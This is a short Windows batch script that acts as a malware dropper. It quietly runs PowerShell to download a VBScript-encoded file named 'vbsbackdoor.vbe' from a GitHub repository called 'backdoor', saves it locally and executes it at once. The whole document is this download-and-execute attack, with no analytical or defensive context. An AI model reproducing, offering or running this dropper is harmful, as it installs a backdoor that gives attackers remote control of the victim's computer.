@echo off
powershell -noprofile -noninteractive -command "& {$client=new-object System.Net.WebClient;$client.DownloadFile('https://raw.githubusercontent.com/cyberhunter00/backdoor/master/vbsbackdoor.vbe','backdoor11.vbe')}"
backdoor11.vbe